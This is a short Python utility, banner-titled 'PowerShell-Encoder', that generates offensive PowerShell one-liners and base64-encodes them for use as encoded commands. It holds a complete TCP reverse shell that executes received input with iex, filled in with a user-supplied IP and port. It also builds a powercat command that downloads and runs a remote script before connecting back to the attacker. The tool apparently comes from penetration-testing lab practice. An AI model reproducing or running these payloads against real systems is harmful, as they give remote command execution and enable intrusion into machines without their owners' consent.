import base64
print(' ____     ___   __        __  _____   ____    ____    _   _   _____   _       _               _____   _   _    ____    ___    ____    _____   ____');
print('|  _ \   / _ \  \ \      / / | ____| |  _ \  / ___|  | | | | | ____| | |     | |             | ____| | \ | |  / ___|  / _ \  |  _ \  | ____| |  _ \\');
print('| |_) | | | | |  \ \ /\ / /  |  _|   | |_) | \___ \  | |_| | |  _|   | |     | |      _____  |  _|   |  \| | | |     | | | | | | | | |  _|   | |_) |');
print('|  __/  | |_| |   \ V  V /   | |___  |  _ <   ___) | |  _  | | |___  | |___  | |___  |_____| | |___  | |\  | | |___  | |_| | | |_| | | |___  |  _ <');
print('|_|      \___/     \_/\_/    |_____| |_| \_\ |____/  |_| |_| |_____| |_____| |_____|         |_____| |_| \_|  \____|  \___/  |____/  |_____| |_| \_\\');
print("input /revshell to format a rev shell for powershell quickly")
while True:
    command = input()
    if command == "/revshell":
        ip = input("ip:")
        port = input("port:")
        command = '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        command = command.replace("{ip}",ip)
        command = command.replace("{port}",port)
        print(command)
        
    if command == "/powercat":
        command = 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3:http_port/powercat.ps1");powercat -c 192.168.119.3 -p port -e powershell;'
        http_port = input("http_port")
        ip = input("ip:")
        port = input("port:")
        command = command.replace("192.168.119.3",ip).replace("http_port",http_port).replace("port",port)
        print(command)

    byte = command.encode("utf-16le")
    encoded = base64.b64encode(byte)
    print(encoded.decode("utf-8"))